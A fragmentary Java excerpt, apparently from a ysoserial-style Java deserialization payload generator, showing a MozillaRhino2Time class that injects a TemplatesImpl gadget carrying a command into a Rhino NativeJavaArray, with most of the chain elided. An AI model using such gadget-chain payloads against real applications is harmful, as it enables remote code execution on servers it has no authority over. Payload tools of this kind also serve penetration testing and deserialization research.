...
public class MozillaRhino2Time implements ObjectPayload<Object> {
    ...
    public Object getObject( String command) throws Exception {
        ...
        Reflections.setFieldValue(nativeJavaArray, "javaObject", Gadgets.createTemplatesImplTime(command));
    ...
    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(MozillaRhino2Time.class, args);
    }
